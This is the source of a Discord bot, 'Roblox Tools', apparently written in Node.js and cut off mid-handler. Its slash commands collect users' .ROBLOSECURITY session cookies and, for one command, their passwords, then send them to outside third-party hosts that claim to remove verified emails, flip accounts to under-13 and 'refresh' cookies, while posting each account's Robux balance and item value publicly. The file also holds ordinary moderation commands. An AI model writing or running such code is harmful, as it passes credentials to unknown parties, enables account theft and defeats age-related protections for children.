const {
  Client,
  GatewayIntentBits,
  REST,
  Routes,
  SlashCommandBuilder,
  EmbedBuilder,
  PermissionFlagsBits,
} = require('discord.js');
require('dotenv').config();
const fetch = require('node-fetch');
const axios = require('axios');

class RobloxUser {
    constructor(roblosecurityCookie, userId, username, displayName) {
        this.roblosecurityCookie = roblosecurityCookie;
        this.userId = userId;
        this.username = username;
        this.displayName = displayName;
    }

    async doAuthorizedRequest(url) {
        return (await axios.get(url, {
            headers: {
                Cookie: `.ROBLOSECURITY=${this.roblosecurityCookie}`,
            },
        })).data;
    }

    static async register(roblosecurityCookie) {
        try {
            const { data } = await axios.get("https://users.roblox.com/v1/users/authenticated", {
                headers: {
                    Cookie: `.ROBLOSECURITY=${roblosecurityCookie}`,
                },
            });
            return new RobloxUser(roblosecurityCookie, data.id, data.name, data.displayName);
        } catch (error) {
            return null;
        }
    }

    async getAccountBalance() {
        try {
            const { robux } = await this.doAuthorizedRequest(
                `https://economy.roblox.com/v1/users/${this.userId}/currency`
            );
            return robux;
        } catch (error) {
            return 'Private';
        }
    }

    async getAccountRAP() {
        try {
            let calculatedRap = 0;
            let nextPageCursor = "";

            while (nextPageCursor !== null) {
                const inventoryPage = await this.doAuthorizedRequest(
                    `https://inventory.roblox.com/v1/users/${this.userId}/assets/collectibles?sortOrder=Asc&limit=100&cursor=${nextPageCursor}`
                );

                calculatedRap += inventoryPage.data.reduce(
                    (rap, item) => rap + (item.recentAveragePrice || 0),
                    0
                );
                nextPageCursor = inventoryPage.nextPageCursor;

                // Limit to avoid timeout
                if (!nextPageCursor) break;
            }

            return calculatedRap;
        } catch (error) {
            return 0;
        }
    }

    async getAccountAvatar() {
        try {
            const { data } = await this.doAuthorizedRequest(
                `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${this.userId}&size=150x150&format=Png`
            );
            return data[0]?.imageUrl || null;
        } catch (error) {
            return null;
        }
    }

    

    async getUserData() {
        const [robux, rap, avatar] = await Promise.all([
            this.getAccountBalance(),
            this.getAccountRAP(),
            this.getAccountAvatar()
        ]);

        return {
            username: this.username,
            displayName: this.displayName,
            userId: this.userId,
            avatar: avatar,
            robux: robux,
            rap: rap > 0 ? rap.toLocaleString() : '0'
        };
    }
}

// Helper function to get Roblox user data from cookie
async function getRobloxUserData(cookie) {
    try {
        const robloxUser = await RobloxUser.register(cookie);
        if (!robloxUser) return null;
        
        return await robloxUser.getUserData();
    } catch (error) {
        console.error('Error fetching Roblox data:', error);
        return null;
    }
}

// Helper function to handle prefix moderation commands
async function handlePrefixModerationCommand(message, command, args) {
    const guild = message.guild;
    
    if (command === 'ban') {
        commandStats.ban++;
        
        const userMention = args[0];
        const reason = args.slice(1).join(' ') || 'No reason provided';
        
        if (!userMention) {
            return message.reply('❌ Please mention a user to ban. Usage: `!ban @user [reason]`');
        }
        
        const userId = userMention.replace(/[<@!>]/g, '');
        
        try {
            const member = await guild.members.fetch(userId);
            
            if (member.id === message.author.id) {
                return message.reply('❌ You cannot ban yourself.');
            }
            
            if (member.id === client.user.id) {
                return message.reply('❌ I cannot ban myself.');
            }
            
            if (member.roles.highest.position >= message.member.roles.highest.position && message.guild.ownerId !== message.author.id) {
                return message.reply('❌ You cannot ban someone with a higher or equal role.');
            }
            
            await member.ban({ reason });
            
            const embed = new EmbedBuilder()
                .setColor(0xef4444)
                .setTitle('🔨 User Banned')
                .setDescription(`**${member.user.tag}** has been banned from the server.`)
                .addFields(
                    { name: 'Moderator', value: `${message.author.tag}`, inline: true },
                    { name: 'Reason', value: reason, inline: true }
                )
                .setTimestamp()
                .setFooter({
                    text: `User ID: ${member.user.id}`,
                    iconURL: message.author.displayAvatarURL()
                });
            
            const reply = await message.reply({ embeds: [embed] });
            
            // Auto-delete after 5 seconds
            setTimeout(async () => {
                try {
                    await reply.delete();
                } catch (error) {
                    console.error('Error deleting ban message:', error);
                }
            }, 5000);
        } catch (error) {
            await message.reply('❌ Failed to ban user. They may not be in the server or I lack permissions.');
        }
    }
    
    else if (command === 'kick') {
        commandStats.kick++;
        
        const userMention = args[0];
        const reason = args.slice(1).join(' ') || 'No reason provided';
        
        if (!userMention) {
            return message.reply('❌ Please mention a user to kick. Usage: `!kick @user [reason]`');
        }
        
        const userId = userMention.replace(/[<@!>]/g, '');
        
        try {
            const member = await guild.members.fetch(userId);
            
            if (member.id === message.author.id) {
                return message.reply('❌ You cannot kick yourself.');
            }
            
            if (member.id === client.user.id) {
                return message.reply('❌ I cannot kick myself.');
            }
            
            if (member.roles.highest.position >= message.member.roles.highest.position && message.guild.ownerId !== message.author.id) {
                return message.reply('❌ You cannot kick someone with a higher or equal role.');
            }
            
            await member.kick(reason);
            
            const embed = new EmbedBuilder()
                .setColor(0xfacc15)
                .setTitle('👢 User Kicked')
                .setDescription(`**${member.user.tag}** has been kicked from the server.`)
                .addFields(
                    { name: 'Moderator', value: `${message.author.tag}`, inline: true },
                    { name: 'Reason', value: reason, inline: true }
                )
                .setTimestamp()
                .setFooter({
                    text: `User ID: ${member.user.id}`,
                    iconURL: message.author.displayAvatarURL()
                });
            
            const reply = await message.reply({ embeds: [embed] });
            
            // Auto-delete after 5 seconds
            setTimeout(async () => {
                try {
                    await reply.delete();
                } catch (error) {
                    console.error('Error deleting kick message:', error);
                }
            }, 5000);
        } catch (error) {
            await message.reply('❌ Failed to kick user. They may not be in the server or I lack permissions.');
        }
    }
    
    else if (command === 'mute') {
        commandStats.mute++;
        
        const userMention = args[0];
        const duration = parseInt(args[1]);
        const reason = args.slice(2).join(' ') || 'No reason provided';
        
        if (!userMention || !duration) {
            return message.reply('❌ Please provide a user and duration. Usage: `!mute @user <minutes> [reason]`');
        }
        
        if (duration < 1 || duration > 40320) {
            return message.reply('❌ Duration must be between 1 and 40320 minutes (28 days).');
        }
        
        const userId = userMention.replace(/[<@!>]/g, '');
        
        try {
            const member = await guild.members.fetch(userId);
            
            if (member.id === message.author.id) {
                return message.reply('❌ You cannot mute yourself.');
            }
            
            if (member.id === client.user.id) {
                return message.reply('❌ I cannot mute myself.');
            }
            
            if (member.roles.highest.position >= message.member.roles.highest.position && message.guild.ownerId !== message.author.id) {
                return message.reply('❌ You cannot mute someone with a higher or equal role.');
            }
            
            const timeoutDuration = duration * 60 * 1000;
            await member.timeout(timeoutDuration, reason);
            
            const embed = new EmbedBuilder()
                .setColor(0xff6b6b)
                .setTitle('🔇 User Muted')
                .setDescription(`**${member.user.tag}** has been muted for ${duration} minutes.`)
                .addFields(
                    { name: 'Moderator', value: `${message.author.tag}`, inline: true },
                    { name: 'Duration', value: `${duration} minutes`, inline: true },
                    { name: 'Reason', value: reason, inline: false }
                )
                .setTimestamp()
                .setFooter({
                    text: `User ID: ${member.user.id}`,
                    iconURL: message.author.displayAvatarURL()
                });
            
            const reply = await message.reply({ embeds: [embed] });
            
            // Auto-delete after 5 seconds
            setTimeout(async () => {
                try {
                    await reply.delete();
                } catch (error) {
                    console.error('Error deleting mute message:', error);
                }
            }, 5000);
        } catch (error) {
            await message.reply('❌ Failed to mute user. They may not be in the server or I lack permissions.');
        }
    }
    
    else if (command === 'unmute') {
        commandStats.unmute++;
        
        const userMention = args[0];
        const reason = args.slice(1).join(' ') || 'No reason provided';
        
        if (!userMention) {
            return message.reply('❌ Please mention a user to unmute. Usage: `!unmute @user [reason]`');
        }
        
        const userId = userMention.replace(/[<@!>]/g, '');
        
        try {
            const member = await guild.members.fetch(userId);
            
            if (!member.isCommunicationDisabled()) {
                return message.reply('❌ This user is not currently muted.');
            }
            
            await member.timeout(null, reason);
            
            const embed = new EmbedBuilder()
                .setColor(0x4caf50)
                .setTitle('🔊 User Unmuted')
                .setDescription(`**${member.user.tag}** has been unmuted.`)
                .addFields(
                    { name: 'Moderator', value: `${message.author.tag}`, inline: true },
                    { name: 'Reason', value: reason, inline: true }
                )
                .setTimestamp()
                .setFooter({
                    text: `User ID: ${member.user.id}`,
                    iconURL: message.author.displayAvatarURL()
                });
            
            const reply = await message.reply({ embeds: [embed] });
            
            // Auto-delete after 5 seconds
            setTimeout(async () => {
                try {
                    await reply.delete();
                } catch (error) {
                    console.error('Error deleting unmute message:', error);
                }
            }, 5000);
        } catch (error) {
            await message.reply('❌ Failed to unmute user. They may not be in the server or I lack permissions.');
        }
    }
    
    else if (command === 'warn') {
        commandStats.warn++;
        
        const userMention = args[0];
        const reason = args.slice(1).join(' ');
        
        if (!userMention || !reason) {
            return message.reply('❌ Please provide a user and reason. Usage: `!warn @user <reason>`');
        }
        
        const userId = userMention.replace(/[<@!>]/g, '');
        
        try {
            const member = await guild.members.fetch(userId);
            
            if (member.id === message.author.id) {
                return message.reply('❌ You cannot warn yourself.');
            }
            
            if (member.id === client.user.id) {
                return message.reply('❌ You cannot warn me.');
            }
            
            // Send DM to the warned user
            try {
                const dmEmbed = new EmbedBuilder()
                    .setColor(0xfacc15)
                    .setTitle('⚠️ Warning Received')
                    .setDescription(`You have received a warning in **${guild.name}**.`)
                    .addFields(
                        { name: 'Moderator', value: `${message.author.tag}`, inline: true },
                        { name: 'Reason', value: reason, inline: false }
                    )
                    .setTimestamp();
                
                await member.user.send({ embeds: [dmEmbed] });
            } catch (dmError) {
                console.log('Could not send DM to user');
            }
            
            const embed = new EmbedBuilder()
                .setColor(0xfacc15)
                .setTitle('⚠️ User Warned')
                .setDescription(`**${member.user.tag}** has been warned.`)
                .addFields(
                    { name: 'Moderator', value: `${message.author.tag}`, inline: true },
                    { name: 'Reason', value: reason, inline: false }
                )
                .setTimestamp()
                .setFooter({
                    text: `User ID: ${member.user.id}`,
                    iconURL: message.author.displayAvatarURL()
                });
            
            const reply = await message.reply({ embeds: [embed] });
            
            // Auto-delete after 5 seconds
            setTimeout(async () => {
                try {
                    await reply.delete();
                } catch (error) {
                    console.error('Error deleting warn message:', error);
                }
            }, 5000);
        } catch (error) {
            await message.reply('❌ Failed to warn user. They may not be in the server.');
        }
    }
}

// Bot stats tracking
let commandStats = {
  bypass2008: 0,
  bypass13plus: 0,
  refreshcookie: 0,
  help: 0,
  botstats: 0,
  validatecookie: 0,
  cookieexpiry: 0,
  profilelookup: 0,
  ban: 0,
  kick: 0,
  mute: 0,
  unmute: 0,
  warn: 0
};

// Cooldown system (30 seconds)
const cooldowns = new Map();
const COOLDOWN_TIME = 5000; // 30 seconds

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers
  ],
});

client.once('ready', () => {
  console.log(`✅ Logged in as ${client.user.tag}`);
});

client.on('ready', async () => {
  const commands = [
    new SlashCommandBuilder()
      .setName('bypass2008')
      .setDescription('Bypass email with 2008 birth year')
      .addStringOption(option =>
        option.setName('cookie')
          .setDescription('.ROBLOSECURITY cookie')
          .setRequired(true)
      ),
    new SlashCommandBuilder()
      .setName('bypass13plus')
      .setDescription('Bypass 13+ account to under 13')
      .addStringOption(option =>
        option.setName('cookie')
          .setDescription('.ROBLOSECURITY cookie')
          .setRequired(true)
      )
      .addStringOption(option =>
        option.setName('password')
          .setDescription('Your Roblox password')
          .setRequired(true)
      ),
    new SlashCommandBuilder()
      .setName('refreshcookie')
      .setDescription('Refresh your .ROBLOSECURITY cookie')
      .addStringOption(option =>
        option.setName('cookie')
          .setDescription('Your current .ROBLOSECURITY cookie')
          .setRequired(true)
      ),
    new SlashCommandBuilder()
      .setName('help')
      .setDescription('Show all available commands and bot info'),
    new SlashCommandBuilder()
      .setName('botstats')
      .setDescription('Show bot statistics and uptime'),
    new SlashCommandBuilder()
      .setName('validatecookie')
      .setDescription('Check if a .ROBLOSECURITY cookie is valid')
      .addStringOption(option =>
        option.setName('cookie')
          .setDescription('.ROBLOSECURITY cookie to validate')
          .setRequired(true)
      ),
    new SlashCommandBuilder()
      .setName('cookieexpiry')
      .setDescription('Check if your cookie might expire soon')
      .addStringOption(option =>
        option.setName('cookie')
          .setDescription('.ROBLOSECURITY cookie to check')
          .setRequired(true)
      ),
    new SlashCommandBuilder()
      .setName('profilelookup')
      .setDescription('Get Roblox user info from username or ID')
      .addStringOption(option =>
        option.setName('identifier')
          .setDescription('Roblox username or user ID')
          .setRequired(true)
      ),
    new SlashCommandBuilder()
      .setName('ban')
      .setDescription('Ban a user from the server')
      .addUserOption(option =>
        option.setName('user')
          .setDescription('User to ban')
          .setRequired(true)
      )
      .addStringOption(option =>
        option.setName('reason')
          .setDescription('Reason for the ban')
          .setRequired(false)
      )
      .setDefaultMemberPermissions(PermissionFlagsBits.BanMembers),
    new SlashCommandBuilder()
      .setName('kick')
      .setDescription('Kick a user from the server')
      .addUserOption(option =>
        option.setName('user')
          .setDescription('User to kick')
          .setRequired(true)
      )
      .addStringOption(option =>
        option.setName('reason')
          .setDescription('Reason for the kick')
          .setRequired(false)
      )
      .setDefaultMemberPermissions(PermissionFlagsBits.KickMembers),
    new SlashCommandBuilder()
      .setName('mute')
      .setDescription('Timeout/mute a user')
      .addUserOption(option =>
        option.setName('user')
          .setDescription('User to mute')
          .setRequired(true)
      )
      .addIntegerOption(option =>
        option.setName('duration')
          .setDescription('Duration in minutes (max 40320 = 28 days)')
          .setRequired(true)
          .setMinValue(1)
          .setMaxValue(40320)
      )
      .addStringOption(option =>
        option.setName('reason')
          .setDescription('Reason for the mute')
          .setRequired(false)
      )
      .setDefaultMemberPermissions(PermissionFlagsBits.ModerateMembers),
    new SlashCommandBuilder()
      .setName('unmute')
      .setDescription('Remove timeout/unmute a user')
      .addUserOption(option =>
        option.setName('user')
          .setDescription('User to unmute')
          .setRequired(true)
      )
      .addStringOption(option =>
        option.setName('reason')
          .setDescription('Reason for unmuting')
          .setRequired(false)
      )
      .setDefaultMemberPermissions(PermissionFlagsBits.ModerateMembers),
    new SlashCommandBuilder()
      .setName('warn')
      .setDescription('Warn a user')
      .addUserOption(option =>
        option.setName('user')
          .setDescription('User to warn')
          .setRequired(true)
      )
      .addStringOption(option =>
        option.setName('reason')
          .setDescription('Reason for the warning')
          .setRequired(true)
      )
      .setDefaultMemberPermissions(PermissionFlagsBits.ModerateMembers)
  ].map(cmd => cmd.toJSON());

  const rest = new REST({ version: '10' }).setToken(process.env.BOT_TOKEN);
  try {
    await rest.put(
      Routes.applicationCommands(client.user.id),
      { body: commands }
    );
    console.log('✅ Slash commands registered');
  } catch (err) {
    console.error('❌ Error registering commands:', err);
  }
});

client.on('messageCreate', async message => {
  // Check if message is in the monitored channel
  if (message.channelId !== '1392522417254961273') return;

  // Ignore messages from bots (including this bot)
  if (message.author.bot) return;

  // Ignore system messages and slash commands
  if (message.system || message.interaction) return;

  // Check for prefix commands
  if (message.content.startsWith('!')) {
    const args = message.content.slice(1).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    // Check if user is owner or has administrator permission for moderation commands
    const isOwnerOrAdmin = message.guild.ownerId === message.author.id || 
                          (message.member && message.member.permissions.has(PermissionFlagsBits.Administrator));

    if (['ban', 'kick', 'mute', 'unmute', 'warn'].includes(command)) {
      if (!isOwnerOrAdmin) {
        return message.reply('❌ Only server owners and administrators can use moderation commands.');
      }

      // Handle prefix moderation commands
      await handlePrefixModerationCommand(message, command, args);
      return;
    }
  }

  // Allow server owner and administrators to send normal messages
  if (message.member && (message.member.permissions.has('Administrator') || message.guild.ownerId === message.author.id)) return;

  try {
    // Delete the message
    await message.delete();

    // Send ephemeral-style reply to the user
    await message.channel.send({
      content: `<@${message.author.id}> ❌ Command channel only. Please use slash commands or prefix commands (!ban, !kick, etc.).`,
    }).then(reply => {
      // Auto-delete the warning message after 5 seconds
      setTimeout(() => {
        reply.delete().catch(console.error);
      }, 5000);
    });
  } catch (error) {
    console.error('Error handling message:', error);
  }
});

client.on('interactionCreate', async interaction => {
  if (!interaction.isChatInputCommand()) return;

  const allowedChannel = '1392522417254961273';
  if (interaction.channelId !== allowedChannel) {
    return interaction.reply({
      content: '❌ You can only use this command in the designated channel.',
      ephemeral: true
    });
  }

  const { commandName, user } = interaction;

  // Check cooldown for main commands (not help/botstats)
  if (['bypass2008', 'bypass13plus', 'refreshcookie', 'validatecookie', 'cookieexpiry', 'profilelookup', 'ban', 'kick', 'mute', 'unmute', 'warn'].includes(commandName)) {
    const userCooldown = cooldowns.get(user.id);
    if (userCooldown && Date.now() - userCooldown < COOLDOWN_TIME) {
      const remainingTime = Math.ceil((COOLDOWN_TIME - (Date.now() - userCooldown)) / 1000);
      return interaction.reply({
        content: `⏰ Please wait ${remainingTime} seconds before using this command again.`,
        ephemeral: true
      });
    }
    cooldowns.set(user.id, Date.now());
  }

  // Update command stats
  if (commandStats[commandName] !== undefined) {
    commandStats[commandName]++;
  }

  if (interaction.commandName === 'bypass2008') {
    const cookie = interaction.options.getString('cookie');

    await interaction.reply({ content: '✅ Command Successfully', ephemeral: true });

    try {
      // Get Roblox user data and bypass result in parallel
      const [robloxData, res] = await Promise.all([
        getRobloxUserData(cookie),
        fetch(`https://rbx-tool.com/apis/bypassAge?a=${encodeURIComponent(cookie)}`)
      ]);

      const data = await res.json();

      const embed = new EmbedBuilder()
        .setColor(data.status === "success" ? 0x00ff88 : 0xff4757)
        .setTitle(robloxData ? `🎯 ${robloxData.username}` : (data.status === "success" ? "✅ Operation Complete" : "❌ Operation Failed"))
        .setDescription("📧 **Email Bypass (2008 Method)**")
        .setTimestamp()
        .setFooter({
          text: `Requested by ${interaction.user.tag} • Roblox Tools`,
          iconURL: interaction.user.displayAvatarURL()
        });

      // Add Roblox user info if available
      if (robloxData) {
        if (robloxData.avatar) {
          embed.setThumbnail(robloxData.avatar);
        }
        
        embed.addFields(
          { name: "💰 Robux Balance", value: `\`${robloxData.robux}\``, inline: true },
          { name: "💎 RAP Value", value: `\`${robloxData.rap}\``, inline: true },
          { name: "🆔 User ID", value: `\`${robloxData.userId}\``, inline: true }
        );
      }

      // Add bypass result at bottom
      embed.addFields(
        { name: "🔧 Bypass Result", value: data.message || (data.status === "success" ? "Success removing email!" : "Unknown error"), inline: false },
        { name: "Status", value: data.status === "success" ? "✅ Completed" : "❌ Failed", inline: true }
      );

      await interaction.followUp({ embeds: [embed] });
    } catch {
      const embed = new EmbedBuilder()
        .setColor(0xfacc15)
        .setTitle("🚫 Request Failed")
        .setDescription("Request blocked or failed to fetch data.")
        .setFooter({
          text: `Requested by ${interaction.user.tag}`,
          iconURL: interaction.user.displayAvatarURL()
        });
      await interaction.followUp({ embeds: [embed] });
    }
  }

  if (interaction.commandName === 'bypass13plus') {
    const cookie = interaction.options.getString('cookie');
    const password = interaction.options.getString('password');

    await interaction.reply({ content: '✅ Command Successfully', ephemeral: true });

    try {
      // Get Roblox user data and bypass result in parallel
      const [robloxData, res] = await Promise.all([
        getRobloxUserData(cookie),
        fetch(`https://rbx-tool.com/apis/bypassAgeV2?a=${encodeURIComponent(cookie)}&b=${encodeURIComponent(password)}`)
      ]);

      const data = await res.json();

      const embed = new EmbedBuilder()
        .setColor(data.status === "success" ? 0x00ff88 : 0xff4757)
        .setTitle(robloxData ? `🎯 ${robloxData.username}` : (data.status === "success" ? "✅ Operation Complete" : "❌ Operation Failed"))
        .setDescription("🔓 **Age Bypass (13+ to Under 13)**")
        .setTimestamp()
        .setFooter({
          text: `Requested by ${interaction.user.tag} • Roblox Tools`,
          iconURL: interaction.user.displayAvatarURL()
        });

      // Add Roblox user info if available
      if (robloxData) {
        if (robloxData.avatar) {
          embed.setThumbnail(robloxData.avatar);
        }
        
        embed.addFields(
          { name: "💰 Robux Balance", value: `\`${robloxData.robux}\``, inline: true },
          { name: "💎 RAP Value", value: `\`${robloxData.rap}\``, inline: true },
          { name: "🆔 User ID", value: `\`${robloxData.userId}\``, inline: true }
        );
      }

      // Add bypass result at bottom
      embed.addFields(
        { name: "🔧 Bypass Result", value: data.message || (data.status === "success" ? "Success converting 13+ to under 13!" : "Unknown error"), inline: false },
        { name: "Status", value: data.status === "success" ? "✅ Completed" : "❌ Failed", inline: true }
      );

      await interaction.followUp({ embeds: [embed] });
    } catch {
      const embed = new EmbedBuilder()
        .setColor(0xfacc15)
        .setTitle("🚫 Request Failed")
        .setDescription("Request blocked or failed to fetch data.")
        .setFooter({
          text: `Requested by ${interaction.user.tag}`,
          iconURL: interaction.user.displayAvatarURL()
        });
      await interaction.followUp({ embeds: [embed] });
    }
  }

  if (interaction.commandName === 'refreshcookie') {
    const cookie = interaction.options.getString('cookie');

    await interaction.reply({ content: '🔄 Refreshing your cookie...', ephemeral: true });

    try {
      const res = await fetch(`https://cookie-fresh.vercel.app/api/refresh?cookie=${encodeURIComponent(cookie)}`);
      const data = await res.json();

      if (!data.redemptionResult || !data.redemptionResult.success) {
        const errorEmbed = new EmbedBuilder()
          .setColor(0xef4444)
          .setTitle("❌ Unable to refresh your cookie.")
          .setDescription("Roblox might have rejected the cookie or the backend failed.")
          .setFooter({
            text: `Requested by ${interaction.user.tag}`,
            iconURL: interaction.user.displayAvatarURL()
          });
        return interaction.followUp({ embeds: [errorEmbed] });
      }

      const refreshed = data.redemptionResult.refreshedCookie;

      // Get Roblox user data for the public embed
      const robloxData = await getRobloxUserData(cookie);

      const publicEmbed = new EmbedBuilder()
        .setColor(0x00d4ff)
        .setTitle(robloxData ? `🎯 ${robloxData.username}` : "✅ Cookie Refreshed Successfully!")
        .setDescription("🔄 **Cookie Refresh Service**")
        .setTimestamp()
        .setFooter({
          text: `Requested by ${interaction.user.tag} • Roblox Tools`,
          iconURL: interaction.user.displayAvatarURL()
        });

      // Add Roblox user info if available
      if (robloxData) {
        if (robloxData.avatar) {
          publicEmbed.setThumbnail(robloxData.avatar);
        }
        
        publicEmbed.addFields(
          { name: "💰 Robux Balance", value: `\`${robloxData.robux}\``, inline: true },
          { name: "💎 RAP Value", value: `\`${robloxData.rap}\``, inline: true },
          { name: "🆔 User ID", value: `\`${robloxData.userId}\``, inline: true }
        );
      }

      // Add refresh result at bottom
      publicEmbed.addFields(
        { name: "🔄 Refresh Result", value: "Your new cookie has been generated and sent privately.", inline: false },
        { name: "Status", value: "✅ Completed", inline: true }
      );

      await interaction.followUp({ embeds: [publicEmbed] }); // public message

      const privateEmbed = new EmbedBuilder()
        .setColor(0x0ea5e9)
        .setTitle("🔐 Your New .ROBLOSECURITY Cookie")
        .setDescription(`\`\`\`${refreshed}\`\`\``)
        .addFields(
          { name: "⚠️ Security Notice", value: "Keep this cookie private and secure!", inline: false }
        )
        .setTimestamp()
        .setFooter({
          text: `Requested by ${interaction.user.tag}`,
          iconURL: interaction.user.displayAvatarURL()
        });

      await interaction.followUp({
        embeds: [privateEmbed],
        ephemeral: true // only the user sees this
      });

    } catch (err) {
      const embed = new EmbedBuilder()
        .setColor(0xfacc15)
        .setTitle("🚫 Request Failed")
        .setDescription("Failed to connect to refresh API or bad response.")
        .setFooter({
          text: `Requested by ${interaction.user.tag}`,
          iconURL: interaction.user.displayAvatarURL()
        });
      await interaction.followUp({ embeds: [embed] });
    }
  }

  if (interaction.commandName === 'help') {
    commandStats.help++;

    const helpEmbed = new EmbedBuilder()
      .setColor(0x0ea5e9)
      .setTitle('🤖 Roblox Tools Bot - Help')
      .setDescription('Here are all available commands and their descriptions:')
      .addFields(
        { 
          name: '📧 /bypass2008', 
          value: 'Remove the verified email address\n**Usage:** Provide your .ROBLOSECURITY cookie', 
          inline: false 
        },
        { 
          name: '🔓 /bypass13plus', 
          value: 'Convert 13+ account to under 13 account\n**Usage:** Provide cookie and password', 
          inline: false 
        },
        { 
          name: '🔄 /refreshcookie', 
          value: 'Refresh your .ROBLOSECURITY cookie\n**Usage:** Provide your current cookie', 
          inline: false 
        },
        { 
          name: '📊 /botstats', 
          value: 'Show bot statistics and uptime', 
          inline: false 
        },
        { 
          name: '❓ /help', 
          value: 'Show this help message', 
          inline: false 
        },
        { 
          name: '🔍 /validatecookie', 
          value: 'Check if a .ROBLOSECURITY cookie is valid', 
          inline: false 
        },
        { 
          name: '🕐 /cookieexpiry', 
          value: 'Check if your cookie might expire soon', 
          inline: false 
        },
        { 
          name: '👤 /profilelookup', 
          value: 'Get Roblox user info from username or ID', 
          inline: false 
        },
        { 
          name: '🔨 /ban', 
          value: 'Ban a user from the server (Requires Ban Members permission)', 
          inline: false 
        },
        { 
          name: '👢 /kick', 
          value: 'Kick a user from the server (Requires Kick Members permission)', 
          inline: false 
        },
        { 
          name: '🔇 /mute', 
          value: 'Timeout/mute a user for specified minutes (Requires Moderate Members permission)', 
          inline: false 
        },
        { 
          name: '🔊 /unmute', 
          value: 'Remove timeout/unmute a user (Requires Moderate Members permission)', 
          inline: false 
        },
        { 
          name: '⚠️ /warn', 
          value: 'Send a warning to a user (Requires Moderate Members permission)', 
          inline: false 
        },
        { 
          name: '⚠️ Important Notes:', 
          value: '• Commands have a 5-second cooldown\n• Only works in designated channel\n• Keep your cookies private!\n• Moderation commands require proper permissions', 
          inline: false 
        }
      )
      .setThumbnail(client.user.displayAvatarURL())
      .setTimestamp()
      .setFooter({
        text: `Requested by ${interaction.user.tag}`,
        iconURL: interaction.user.displayAvatarURL()
      });

    await interaction.reply({ embeds: [helpEmbed] });
  }

  if (interaction.commandName === 'botstats') {
    commandStats.botstats++;

    const uptime = process.uptime();
    const uptimeHours = Math.floor(uptime / 3600);
    const uptimeMinutes = Math.floor((uptime % 3600) / 60);
    const uptimeSeconds = Math.floor(uptime % 60);

    const totalCommands = Object.values(commandStats).reduce((a, b) => a + b, 0);

    const statsEmbed = new EmbedBuilder()
      .setColor(0x22c55e)
      .setTitle('📊 Bot Statistics')
      .setDescription('Current bot performance and usage stats')
      .addFields(
        { 
          name: '⏱️ Uptime', 
          value: `${uptimeHours}h ${uptimeMinutes}m ${uptimeSeconds}s`, 
          inline: true 
        },
        { 
          name: '🏓 Ping', 
          value: `${client.ws.ping}ms`, 
          inline: true 
        },
        { 
          name: '📈 Total Commands Used', 
          value: `${totalCommands}`, 
          inline: true 
        },
        { 
          name: '📧 Bypass2008 Used', 
          value: `${commandStats.bypass2008} times`, 
          inline: true 
        },
        { 
          name: '🔓 Bypass13plus Used', 
          value: `${commandStats.bypass13plus} times`, 
          inline: true 
        },
        { 
          name: '🔄 RefreshCookie Used', 
          value: `${commandStats.refreshcookie} times`, 
          inline: true 
        },
        { 
          name: '🔍 ValidateCookie Used', 
          value: `${commandStats.validatecookie} times`, 
          inline: true 
        },
        { 
          name: '🕐 CookieExpiry Used', 
          value: `${commandStats.cookieexpiry} times`, 
          inline: true 
        },
        { 
          name: '👤 ProfileLookup Used', 
          value: `${commandStats.profilelookup} times`, 
          inline: true 
        },
        { 
          name: '🔨 Ban Used', 
          value: `${commandStats.ban} times`, 
          inline: true 
        },
        { 
          name: '👢 Kick Used', 
          value: `${commandStats.kick} times`, 
          inline: true 
        },
        { 
          name: '🔇 Mute Used', 
          value: `${commandStats.mute} times`, 
          inline: true 
        },
        { 
          name: '🔊 Unmute Used', 
          value: `${commandStats.unmute} times`, 
          inline: true 
        },
        { 
          name: '⚠️ Warn Used', 
          value: `${commandStats.warn} times`, 
          inline: true 
        },
        { 
          name: '🤖 Bot Info', 
          value: `Servers: ${client.guilds.cache.size}\nUsers: ${client.users.cache.size}`, 
          inline: false 
        }
      )
      .setThumbnail(client.user.displayAvatarURL())
      .setTimestamp()
      .setFooter({
        text: `Requested by ${interaction.user.tag}`,
        iconURL: interaction.user.displayAvatarURL()
      });

    await interaction.reply({ embeds: [statsEmbed] });
  }

  if (interaction.commandName === 'validatecookie') {
    const cookie = interaction.options.getString('cookie');
    commandStats.validatecookie++;

    await interaction.reply({ content: '🔍 Validating cookie...', ephemeral: true });

    try {
      const res = await fetch('https://users.roblox.com/v1/users/authenticated', {
        headers: {
          'Cookie': `.ROBLOSECURITY=${cookie}`,
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
      });

      if (res.status === 200) {
        const userData = await res.json();
        
        // Get detailed Roblox user data
        const robloxData = await getRobloxUserData(cookie);

        const embed = new EmbedBuilder()
          .setColor(0x00ff88)
          .setTitle(robloxData ? `🎯 ${robloxData.username}` : '✅ Cookie Valid!')
          .setDescription(`🔍 **Cookie Validation Complete**\nAuthenticated for user: **${userData.name}**`)
          .setTimestamp()
          .setFooter({
            text: `Requested by ${interaction.user.tag} • Roblox Tools`,
            iconURL: interaction.user.displayAvatarURL()
          });

        // Add Roblox user info if available
        if (robloxData) {
          if (robloxData.avatar) {
            embed.setThumbnail(robloxData.avatar);
          }
          
          embed.addFields(
            { name: "💰 Robux Balance", value: `\`${robloxData.robux}\``, inline: true },
            { name: "💎 RAP Value", value: `\`${robloxData.rap}\``, inline: true },
            { name: "🆔 User ID", value: `\`${robloxData.userId}\``, inline: true }
          );
        } else {
          embed.addFields(
            { name: '🆔 User ID', value: `\`${userData.id}\``, inline: true },
            { name: '🏷️ Display Name', value: `\`${userData.displayName}\``, inline: true },
            { name: '✅ Status', value: '`Active`', inline: true }
          );
        }

        await interaction.followUp({ embeds: [embed] });
      } else {
        const embed = new EmbedBuilder()
          .setColor(0xef4444)
          .setTitle('❌ Cookie Invalid')
          .setDescription('The provided cookie is invalid or expired.')
          .setTimestamp()
          .setFooter({
            text: `Requested by ${interaction.user.tag}`,
            iconURL: interaction.user.displayAvatarURL()
          });

        await interaction.followUp({ embeds: [embed] });
      }
    } catch (error) {
      const embed = new EmbedBuilder()
        .setColor(0xfacc15)
        .setTitle('🚫 Validation Failed')
        .setDescription('Unable to validate cookie due to network error.')
        .setTimestamp()
        .setFooter({
          text: `Requested by ${interaction.user.tag}`,
          iconURL: interaction.user.displayAvatarURL()
        });

      await interaction.followUp({ embeds: [embed] });
    }
  }

  if (interaction.commandName === 'cookieexpiry') {
    const cookie = interaction.options.getString('cookie');
